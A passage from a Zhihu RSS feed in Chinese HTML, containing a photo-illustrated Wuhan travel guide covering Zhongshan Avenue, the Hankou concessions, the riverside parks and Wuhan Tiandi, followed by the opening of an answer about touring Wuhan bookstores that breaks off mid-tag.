data-rawwidth=\"4032\" data-rawheight=\"3024\" data-size=\"normal\" data-caption=\"江汉路和中山大道交叉十字路口夜景，图为兴业银行大楼（复建建筑）——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-5f6777da7156924a92e3a5388f35a4bb\" data-watermark-src=\"v2-3889c04db4182c970850e32c526f7024\" data-private-watermark-src=\"v2-06e2890d66061831bddff90594b4fe8f\"></p>\n<h3>汉口中山大道——中国城市最热闹的商业大街</h3>\n<p>汉口中山大道：百年商业老街，西南起于硚口，东北止于长江二桥引桥下，全长8.4公里，横贯汉口老城区，街边店铺林立，街上车水马龙，和江汉路交汇的十字路口周边，过去是今天是将来也是武汉三镇最热闹的最人气的商业大街，特别是在街道两侧历史悠久的宏伟瑰丽的老洋楼的衬托下……</p>\n<p><img src=\"https://pic1.zhimg.com/v2-b0fff6cd457c30cec4687783cb88b57d_720w.jpg?rss\" data-rawwidth=\"3024\" data-rawheight=\"4032\" data-size=\"normal\" data-caption=\"汉口水塔：中山大道后城马路时期清末第一幢西式建筑，当时汉口最高建筑——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-b0fff6cd457c30cec4687783cb88b57d\" data-watermark-src=\"v2-ebd7fbe0da4e38202e85ebcb964fb2d3\" data-private-watermark-src=\"v2-013807eae1282eb1d7f8a3d583312191\"></p>\n<p>光绪三十三年（1907年），拆除汉口城墙，将墙基改建马路，上起六渡桥，下至江汉路，名为后城马路。此后数十年，后城马路自江汉路开始向东北方向延伸铺设，逐渐形成今天的规模。</p>\n<p>1927年，改“后城马路”为“中山大道”。 </p>\n<p><img src=\"https://pic1.zhimg.com/v2-a536d254fbf578a2c4ef00cfe7d24fbb_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"3024\" data-size=\"normal\" data-caption=\"中山大道六渡桥一段，曾经是老汉口华埠最热闹最市民的街区——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-a536d254fbf578a2c4ef00cfe7d24fbb\" data-watermark-src=\"v2-263a6186a4cc5ebc6e5a137b806ba892\" data-private-watermark-src=\"v2-a3f7a12128f1943fde73ac6ffdf0eb91\"></p>\n<p>长长一条大街（大马路）横贯汉口老城区，大银行、大商埠、大公司、大饭店、大酒楼，沿街老戏院子数十处，沿街老店美食数十家，白天，门庭洞开，金红翠紫，夜里，华灯初上，金辉满目，寸土寸金的繁华地，时光过去一百年，建筑留下，成为历史。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-5ae9843d7a0f55425b39246da1daa466_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"3024\" data-size=\"normal\" data-caption=\"中山大道老银行-汉口金城银行，现武汉美术馆——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-5ae9843d7a0f55425b39246da1daa466\" data-watermark-src=\"v2-a8ecb8db33f7a33cf4445bbcad5a740b\" data-private-watermark-src=\"v2-6b81487573088bd34341f32a3e706b2b\"></p>\n<p>走过中国许多城市，定下心来想想，如武汉市中山大道一般历史（114年）、一般景观（百年老建筑和现代大商埠）、一般繁华富丽（吃喝玩乐生意特别好尤其是年轻人特别多）的大街，好像是再也没有第二条（可以反驳）。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-6e819fa0d7dad3d1ddd076daa1fe8f43_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"3024\" data-size=\"normal\" data-caption=\"汉口中山大道江汉路一段——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-6e819fa0d7dad3d1ddd076daa1fe8f43\" data-watermark-src=\"v2-5f222ba964dd15f72aa0f87e792bf52b\" data-private-watermark-src=\"v2-c97d460db42c0ab5dd8d483883f73031\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-7216ae0bf56b835f97a8752f290a4ea8_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"3024\" data-size=\"normal\" data-caption=\"中山大道南洋大楼（南洋烟草公司）第三层为1926年至1927年武汉国民政府办公地——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-7216ae0bf56b835f97a8752f290a4ea8\" data-watermark-src=\"v2-a96f84b37bda03f4613f057b3a66a278\" data-private-watermark-src=\"v2-899806aebbd62a43d93a3354d4ecc467\"></p>\n<p><b>小结：</b>中山大道太长，全部走完不现实。时间有限情况下，可以选择游玩江汉路和中山大道十字路口周边，游玩目的：看百年历史老建筑，买东西（个人随意，两条街上基本什么东西都有），吃东西（百度搜或沿街找）。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-62566f91a1aa4d7378a1782311cdaad1_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"3024\" data-size=\"normal\" data-caption=\"中山大道民众乐园，建于20世纪初，与上海大世界、天津劝业场并称为当时中国三大娱乐场（指戏剧等综合娱乐）。不过现在室内已经一无所有，街边看看看建筑还是可以的——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-62566f91a1aa4d7378a1782311cdaad1\" data-watermark-src=\"v2-a7656b49ad73cb8ce63a03f7b332a982\" data-private-watermark-src=\"v2-fb7846aa1e40dd729c9730cbd3144b09\"></p>\n<h3>汉口老租界一百五十年</h3>\n<p><img src=\"https://pic4.zhimg.com/v2-f4820c73a419f8c4e7bf0f790940daa8_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"汉口开埠，指武汉三镇海外贸易开始，既如此必须设海关，图中汉口海关江汉关，设于1861年，中国政府办公机构，位于华界和租界交汇处，沿江大道边，江汉路顶端，放在这一节文字，代表汉口外贸历史起源，不属租界，不属租界——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-f4820c73a419f8c4e7bf0f790940daa8\" data-watermark-src=\"v2-8719baaa33ad3ec5cd30ddc43f82cca5\" data-private-watermark-src=\"v2-f58ef736ba22ec69a035519b554642ab\"></p>\n<p>游玩武汉，时间容许的情况下，可以去去汉口老租界。租界在中国，只有几个城市有，假如自家城市没有的话，来汉口瞧个新鲜也是非常值得的。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-eeed6bcdeb947a9860641e1436997a4d_720w.jpg?rss\" data-rawwidth=\"2587\" data-rawheight=\"1521\" data-size=\"normal\" data-caption=\"汉口旧英租界沿江大道，图右1：英国汇丰银行，图中心：美国花旗银行——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-eeed6bcdeb947a9860641e1436997a4d\" data-watermark-src=\"v2-59d24ae5b8f2c029f756e6cb34599d71\" data-private-watermark-src=\"v2-f437b986538d49b646122e0d5cdb4ade\"></p>\n<p>1861年，汉口开埠，长江江边划英俄德法日五国租界。1865年，英方耗银二十万两在英租界汉口长江边修筑大堤，沿江建码头，堤内修路（今沿江大道），设海关和各国领事馆，划地招商，投资建设——汉口长江时代开始。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-e6eb3792fccd9bf6e6e2d2ced08b7442_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"3024\" data-size=\"normal\" data-caption=\"汉口黎黄陂路历史街区风貌街汉口旧俄租界——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-e6eb3792fccd9bf6e6e2d2ced08b7442\" data-watermark-src=\"v2-ffa0e2ce2d1e9807095344f9c41e0fc0\" data-private-watermark-src=\"v2-8e8e2ec785815095ce60935dea02bc46\"></p>\n<p>租界建筑包括：商行（公司办公楼）、银行、工厂、住宅、花园、俱乐部、运动场、酒店、餐厅、商店、教堂、医院、学校、报社，领事馆、工部局（租界议会式办公地）、巡捕房……</p>\n<p><img src=\"https://pic3.zhimg.com/v2-fbaab737531dc98dc3400f258dbe1407_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1440\" data-size=\"normal\" data-caption=\"沿江大道边汉口俄租界新泰洋行（俄国茶叶公司大楼）。17世纪中叶华俄茶叶贸易开始，汉口是华俄万里茶叶之路的起点。当年汉口俄侨人数第二日侨人数第一。武汉曾经是一座移民城——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-fbaab737531dc98dc3400f258dbe1407\" data-watermark-src=\"v2-20fd26d809f85075e36e87d464e9fcd9\" data-private-watermark-src=\"v2-afa0be6061e3ba57559dde04cc7363c2\"></p>\n<p>一百六十年沧桑过往，其间陆续兴建起来的老房子留下来的都是历史的馈赠。</p>\n<p>历史建筑欣赏是最合算的旅游项目，艺术美学、城市人文，给予人的精神享受，金钱无法估量。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-71c540bc007536bc3c6c1e563beff047_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"3024\" data-size=\"normal\" data-caption=\"汉口旧法租界——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-71c540bc007536bc3c6c1e563beff047\" data-watermark-src=\"v2-b35da71061acb1cbc1767753a3b74b8d\" data-private-watermark-src=\"v2-4251c89108915b8e9145453391c0ac04\"></p>\n<p>五国租界建在长江之滨，为的是通商的便利，和出入境的便利，看中的就是长江这一条黄金水道，巨轮越洋，从吴淞口直达汉口码头，西方冒险家纷至沓来，金钱垒出一座崭新的汉口。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-73c598c4f36e047b0a1007d74c2a1386_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"汉口法租界德明饭店（法国人资产）当年武汉三镇最奢华时尚的饭店——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-73c598c4f36e047b0a1007d74c2a1386\" data-watermark-src=\"v2-fa97fad17959db2ff8d6317697c92abb\" data-private-watermark-src=\"v2-c97a624aaf53606bcec4ccfd357c91f8\"></p>\n<p><b>小结</b>：汉口老租界面积非常大，想要一日游两日游不可能，可以先在网上搜搜著名建筑或著名的街，然后手机导航有的放矢地玩一玩。如果懒得寻觅，从江汉关开始一直往长江下游走，沿江大道街边老建筑多是百年建筑经典。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-91b1500679270e4fb260c6c3e3a21d00_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1920\" data-size=\"normal\" data-caption=\"汉口沿江大道（汉口英租界）英国汇丰银行（现光大银行），百年老建筑，新古典风格，规模宏大，样式华丽，在中国开埠城市开埠建筑中也可以名列前茅——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-91b1500679270e4fb260c6c3e3a21d00\" data-watermark-src=\"v2-4e34975bb89917e8cdb46b63e8b66d39\" data-private-watermark-src=\"v2-b12c3652f2b6febbc72a78fe0b093c0d\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-6035c4561792d106dfb890d07ea6be37_720w.jpg?rss\" data-rawwidth=\"3568\" data-rawheight=\"2690\" data-size=\"normal\" data-caption=\"2018年5月受武汉外办邀请，胡榴明和黄樱子陪同法国友好代表团朋友游览汉口法租界俄租界交汇街道黎黄陂路历史风貌街——摄影武汉外办小妹妹\" data-watermark=\"watermark\" data-original-src=\"v2-6035c4561792d106dfb890d07ea6be37\" data-watermark-src=\"v2-efd2d1fccf53f27840b5a1f5b2f9a27a\" data-private-watermark-src=\"v2-7b8374dc49cd5d527c400bd7a9174047\"></p>\n<h3>中国最美汉口江滩</h3>\n<p>为了知乎发文，专程去一趟汉口江滩公园，外地朋友来武汉，花半天时间或两个小时三个小时进来游玩，感觉真好！</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9f047ac13429e40245fd7ba6ab7388cc_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"2268\" data-size=\"normal\" data-caption=\"图左沉浸式表演观摩长江游轮《知音号》，图右对江武昌绿地地产武汉第一高楼——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-9f047ac13429e40245fd7ba6ab7388cc\" data-watermark-src=\"v2-22a7e51bf765205fa8d62fc4d359b2ff\" data-private-watermark-src=\"v2-3ee822344e93c9855556130347c990fc\"></p>\n<p>贴一段我文章里的话：</p>\n<p>三镇江滩，最美的还是汉口江滩，我从小生长的地方，熟悉得不能再熟悉，心和身子和它连在一起。</p>\n<p>汉口江滩公园是长江沿岸最美的风景点。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d55ddab8b0975da892c08dd6ca75ae34_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"2268\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d55ddab8b0975da892c08dd6ca75ae34\" data-watermark-src=\"v2-da6d86ce8893866db339cee1412ab691\" data-private-watermark-src=\"v2-87b8eb9ec026208a4ce0d29e470b5aa8\"></p>\n<p>从闹市中走出，来到长江江边，江滩坐下，绿色的草和紫色的花，还有从江面上的凉风，头顶上的太阳。坐在那儿看船看水，看天看地，和江水相亲，和大自然相融合，这样的风景，只是武汉才有，只有汉口的江滩才有。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-75862281771c7d9eb76f5341d9dd9ec0_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"2268\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-75862281771c7d9eb76f5341d9dd9ec0\" data-watermark-src=\"v2-d1d9feed166c59d21f7d57a0fd3a11fe\" data-private-watermark-src=\"v2-4f00e4c3536aabf9bfe7c1366f15e471\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-b6ee4065efbedf773c48041479d1cb1f_720w.jpg?rss\" data-rawwidth=\"2268\" data-rawheight=\"4032\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-b6ee4065efbedf773c48041479d1cb1f\" data-watermark-src=\"v2-5521da939f4d5c0e8e5aca74a095a80a\" data-private-watermark-src=\"v2-70dd4a12e4dfea7036ec634e370693af\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-67c36593e3ad66750c5cf0b0aebd7089_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"2268\" data-size=\"normal\" data-caption=\"以上数图只是汉口江滩公园之一小部分。春花秋月，夏水冬雪，绿树浓阴，樱花芦花，天水之间沿江看风景，十里滨江，汉口江滩公园——汉口江滩图片全部图片胡榴明摄影\" data-watermark=\"watermark\" data-original-src=\"v2-67c36593e3ad66750c5cf0b0aebd7089\" data-watermark-src=\"v2-11ec7022f795598d667ffd7a6e5ebeda\" data-private-watermark-src=\"v2-4ef6291f213a34e6011cac4f0394b040\"></p>\n<h3>武昌江滩</h3>\n<p>武昌江滩长江观景台夜观江景也很美（手机拍摄夜景图片像素不高，实景非常美）！临江大道沿街建筑和街灯也很美！就不写文了，发图大家欣赏下。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c42445f19c7d53e35fa0094b34521d66_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"武昌江滩公园长江观景台，对岸龟山电视塔——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-c42445f19c7d53e35fa0094b34521d66\" data-watermark-src=\"v2-d5c7ac360d36091310e48d280d014140\" data-private-watermark-src=\"v2-6446a301cbdf9bbd26debb6eed4f7f94\" data-tags=\"politic\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-bdb6f12a774282eecbfdac20dc1431e6_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"武昌江滩江畔长江观景台夜观对岸汉阳和汉口的灯火（当时手机像素不高，大家想象感觉一下）——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-bdb6f12a774282eecbfdac20dc1431e6\" data-watermark-src=\"v2-e44982bb0c150e864cc3052f0021f330\" data-private-watermark-src=\"v2-c823fca4b185b2fb6f0d2047fa38c271\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-71976447290714d909a0564f1f73a254_720w.jpg?rss\" data-rawwidth=\"2511\" data-rawheight=\"2560\" data-size=\"normal\" data-caption=\"武昌江滩公园临江大道百年历史老建筑,,今武汉当代艺术中心（Big House）——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-71976447290714d909a0564f1f73a254\" data-watermark-src=\"v2-e9271a5ff5a70051409c30645426e718\" data-private-watermark-src=\"v2-c381f28350102eb0a305d54d87f5030b\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-e329b0f0e02a0a2da6fd4c6054e14edc_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"武昌江滩公园长江观景台——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-e329b0f0e02a0a2da6fd4c6054e14edc\" data-watermark-src=\"v2-29bd095be2adca1a09fc108de68c0751\" data-private-watermark-src=\"v2-3181d7412958021af3f03108853635ab\"></p>\n<h3>武汉天地</h3>\n<p>从汉口江滩公园永清门出来，过沿江大道就是卢沟桥路，往地铁站方向走几分钟便是武汉天地了。我经常跑去喝咖啡或吃晚饭，很方便。</p>\n<p>这一块地方百年前属汉口日租界扩张区，希望详细了解地理人文历史的网友，可以顺带看看我的知乎文章“为什么武汉称为东方芝加哥？”</p>\n<p><img src=\"https://pic1.zhimg.com/v2-e858f20f88cc447f2553cd1a06c7c974_720w.jpg?rss\" data-rawwidth=\"3648\" data-rawheight=\"2736\" data-size=\"normal\" data-caption=\"汉口中山大道两侧的壹方和武汉天地——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-e858f20f88cc447f2553cd1a06c7c974\" data-watermark-src=\"v2-3c38c97f4d9817bb4340af17ada6995d\" data-private-watermark-src=\"v2-e63e174a828a02bea89ca6f50fa96a7b\"></p>\n<p>下面链接：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/people/ye-li-ge-52/answers?page=3\" class=\"internal\">知乎用户</a><p><br></p>\n<p>武汉天地我喜欢去的原因：一、花园式美食商圈设定模式比较满我的意，具体看图……</p>\n<p>二、商圈建筑类型是我喜欢的一类——九幢民国时期老公馆分散园区各处，然后用现代主义建筑和现代复古主义建筑把它们一一很具设计感的连通起来，技术为实用服务，新房子和老房子各具特色相互衬托耸立在那里，绿树浓阴覆盖红色的瓦顶，不太冷不太热的天气，露天餐饮，边吃喝边欣赏树木花草和建筑还有雕塑，可以坐半个白天或半个夜晚。</p>\n<p>建筑设计师团队美国伍德公司，波士顿城市建筑特色（红色裸砖房）引入武汉。</p>\n<p>下面直接上图：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4f649196a234f33a513d8fe9cc5d7f70_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"2268\" data-size=\"normal\" data-caption=\"图上砖沙水泥牌坊式院落门建造于上世纪50年代后，也算很古老了——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-4f649196a234f33a513d8fe9cc5d7f70\" data-watermark-src=\"v2-9d6d04012e8d11d8ae3b9f5a03460d62\" data-private-watermark-src=\"v2-fc86dda04a228e89e886e2cde5a94866\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-95cc32f6d4a5aea5f74611295c7ddfd7_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"2268\" data-size=\"normal\" data-caption=\"圆形红砖建筑围转的店家基本是甜品店和咖啡馆，我经常坐COSTA——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-95cc32f6d4a5aea5f74611295c7ddfd7\" data-watermark-src=\"v2-1da337cb86ba7e5f46e4c028a6b3062c\" data-private-watermark-src=\"v2-338eaa5e2ac6148d447a33dae1383cd0\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-e0bf9211ebb1d65c2b1f9cdf1829ea08_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"2268\" data-size=\"normal\" data-caption=\"露天喷泉夜晚是彩色的——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-e0bf9211ebb1d65c2b1f9cdf1829ea08\" data-watermark-src=\"v2-3a82d4fe3dc291e4ce931621ebf60832\" data-private-watermark-src=\"v2-2b870446ec4f444a5606a79704da3ddf\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-9267562de11be0a0ab7847f46f412d2b_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"2268\" data-size=\"normal\" data-caption=\"这家餐馆所在是一幢民国时期老公馆——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-9267562de11be0a0ab7847f46f412d2b\" data-watermark-src=\"v2-af4e32355ca3022ff5dadde2f9608c7c\" data-private-watermark-src=\"v2-eaf48de157ce836e0fed720b62928910\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-40131fafe9577812b8c00ed2f43c2d38_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"2268\" data-size=\"normal\" data-caption=\"这个地方没进去过，感觉拍照很美的——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-40131fafe9577812b8c00ed2f43c2d38\" data-watermark-src=\"v2-c9021951096c867ff0aa36d201889725\" data-private-watermark-src=\"v2-8e9c3dc455384b30fc736ceebba16c2e\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-5671fa69e30e000d63963b7f71802821_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"2268\" data-size=\"normal\" data-caption=\"实在不理解为什么总是想要排队——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-5671fa69e30e000d63963b7f71802821\" data-watermark-src=\"v2-75db312df1ddb342a2989ebc092086c6\" data-private-watermark-src=\"v2-40878ee441f0392c58e3b6a380f3bba8\"></p>\n<h3>总结：</h3>\n<p>武汉美的好的值得游的景点还有很多很多，我的文章已经够长了（再写下去点开的人更要骂人了），留给别人推介吧！喜欢武汉了解武汉的人很多，武汉城市文化历史城市景观的研究者也很多。</p>\n<p>本答题制作：胡榴明工作室：</p>\n<p>胡榴明（撰文兼摄影）、胡西雷（摄影）、黄樱子（胡榴明工作助理）。</p>\n<p>2021年9月22日</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ye-li-ge-52?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">胡榴明</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>延伸阅读：<br><a href=\"http://www.zhihu.com/question/462790390?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">武汉有哪些人少性价比高的景点？</a><br><a href=\"http://www.zhihu.com/question/23953863?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">下个月准备去武汉，武汉哪些景点可以去逛一逛？</a><br>\n","link":"http://www.zhihu.com/question/482404961/answer/2084790123?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"武汉有哪些有趣的书店？","date":"2021-09-24 08:25:56","description":"\n<p>在武汉待了6年，逛了不少地方，但说起书店，则是最近1年才开始集中逛的。以前我没想过武汉有很多书店，但我自从成为得到APP知识城邦#书店漫步#话题主持人后，我才开始有意识地去了解武汉的书店，<b>到目前为止逛了有30+书店了，包括连锁型书店、独立书店、二手书店。</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-3f84b4a83100a5369c3ec03b54e7e4a5_720w.jpg?rss\" data-caption=\"\" data-size=\"small\" data-rawwidth=\"1080\" data-rawheight=\"1571\" data-watermark=\"watermark\" data-original-src=\"v2-3f84b4a83100a5369c3ec03b54e7e4a5\" data-watermark-src=\"v2-d25f02fd8cc98982c7c39be3f31f6dbc\" data-private-watermark-src=\"v2-3c84fea9deb8356b04512cac492ba2f1\"></p>\n<p>这篇回答，我和大家聊聊我一天之内逛遍武汉8家书店的经历，并附上这些书店的信息，如果大家觉得有兴趣，后续我会更新更多书店，分享给大家。</p>\n<p>逛书店不易，码字不易，如果觉得有用，希望您能给个赞同，本人不胜感激~</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7678dc007c11d5fa66ea60319de739ce_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"911\" data-rawheight=\"836\" data-watermark=\"watermark\" data-original-src=\"v2-7678dc007c11d5fa66ea60319de739ce\" data-watermark-src=\"v2-cb93d7ab2c9e08095925247defcef4d2\" data-private-watermark-src=\"v2-09ed44b480c9a8f75a9b296574e9beb1\"></p>\n<h2>01 泉之旧书社</h2>\n<p>我们的第一站，是泉之旧书社。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f6451d0cca585c0576097662ce34ddf2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"868\" data-rawheight=\"649\" data-watermark=\"watermark\" data-original-src=\"v2-f6451d0cca585c0576097662ce34ddf2\" data-watermark-src=\"v2-25200fb718689840f7966cd02081aab4\" data-private-watermark-src=\"v2-0c0dfe5a26b58a1d090b4d96b1e8ec05\"></p>\n<p><b>该书店基本信息如下：</b></p>\n<p><b>名称：</b>泉之旧书社 </p>\n<p><b>主营：</b>旧书，以人文社科类型为主</p>\n<p><b>地址：</b>武汉市武昌区中华路街街道司门口青龙巷48号</p>\n<p>虽然3月份的时候，我自个儿曾去过一次，但泉之旧书社“隐藏”在老武昌城区一条小巷里，路线我早忘到了一边，这次和阿威老师去，颇费了一番周折：</p>\n<p>我们一路骑车共享单车，走走停停，穿行在老武昌城区拥挤的街道上，好在导航比较靠谱，在穿过了几栋老式居民楼后，我们到一个岔路口转了个弯，便看到了泉之旧书社的牌匾。</p>\n<p>真是一顿好找~</p>\n<p>彼时正是早上8点多，书店刚开张，屋内依旧昏暗，老板看有人来了，就打开了屋里的灯。</p>\n<p>这不打开不要紧，灯一开，阿威老师看到书店里密密麻麻叠放的旧书，整个人都愣住了，虽然我俩都带着口罩，但我分明能看到他眼里发出的光芒，并且能感觉到他嘴里似乎自言自语地说道：</p>\n<p>“真是个好地方，要淘一大波的书了~！”</p>\n<p>接下来，他也真这么干了，看来我的预料是对的。我在一旁，静静看着他“如饥似渴”地大干一场，顺便给他拍些特写，也当自己的摄影练习了。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-bd9bcdcd4237cfde86a3f4fba656b3b4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"865\" data-rawheight=\"864\" data-watermark=\"watermark\" data-original-src=\"v2-bd9bcdcd4237cfde86a3f4fba656b3b4\" data-watermark-src=\"v2-1c7c2ac999e73c9e751cb384097acdfa\" data-private-watermark-src=\"v2-320527e3194392e7693caa3e95e8969b\"></p>\n<p>他的手指极娴熟地划过书架上一本本旧书，眼睛扫过旧书的书脊，那动作行云流水，一看就是经过专业训练的。遇到中意的旧书，就会抽出来翻看，时不时他也向我介绍某本旧书的来历、作者的生平以及这书本身的价值所在，我在一旁听着，若有所悟地点点头。</p>\n<p>这样的过程持续了快2个小时，阿威老师一层书架一层书架的翻阅，最后选了50多本书，以社会学的书籍为主，也涵盖其他领域的一些书籍，总计近300块。</p>\n<p>看着成堆的旧书，我有些发憷，虽然自己平时也是个极爱看书买书的人，但像这种在实体书店成批成批的买，我还是头一次见。</p>\n<p>书太多不方便拿，老板帮我们把书打包好，寄回阿威老师的家里。</p>\n<p>临走前，阿威老师还有些恋恋不舍，他与泉之旧书社合了张影，然后对我说：</p>\n<p>“定安，这真是个极好的旧书店，下次我还要再来光顾~！”</p>\n<p>我点点头，表示赞同。</p>\n<p>在泉之旧书社，我们还遇到了一位大叔，他说自己曾是湖北科技出版社的编辑，如今退休了，常常光顾武汉这些个旧书店，同时，他也表达了如今旧书店生存状态萎缩的担忧。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-b24267a6dfe3e452eedab769e5945a28_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"806\" data-watermark=\"watermark\" data-original-src=\"v2-b24267a6dfe3e452eedab769e5945a28\" data-watermark-src=\"v2-48d1b02b8afbb0a9b05a7eee1cf33924\" data-private-watermark-src=\"v2-245bb4c3b60bb660e0d2d5d8caba8acc\"></p>\n<p>我能理解这种担忧，毕竟，在互联网时代，越来越多的人被各种经过精密设计的、充满诱惑的产品吸引了注意力，真正沉下心来看书的人似乎愈来愈少，从经济学的角度来看，需求端的疲软，难免造成供给端的乏力，旧书店的生存之难，似乎是某种宿命。</p>\n<p>但，我们其实也不要太过担忧这种现象，毕竟，很多东西是我们无法控制的，我比较认可的一种状态是：</p>\n<p>趁着这些旧书店还在的时候，多去逛逛，不留未去之遗憾就行。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c3d3fa00a523bc5e7266c789bc351779_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"867\" data-rawheight=\"642\" data-watermark=\"watermark\" data-original-src=\"v2-c3d3fa00a523bc5e7266c789bc351779\" data-watermark-src=\"v2-09ebc24d115c83226a1a8a2b6f32ed8a\" data-private-watermark-src=\"v2-86d581bd790ff0a2f4f2151177f27060\"></p>\n<h2>02 新华书店（珞喻路店）</h2>\n<p>从泉之旧书社出来，已经是中午时分，我们决定先解决午饭的问题，目的地：街道口。</p>\n<p>从街道口公交站下来，前往不远处的群光广场途中，很凑巧地，我们偶遇了一家新华书店。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-b4356aea6f686859fe3f0d3bdd792230_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"798\" data-watermark=\"watermark\" data-original-src=\"v2-b4356aea6f686859fe3f0d3bdd792230\" 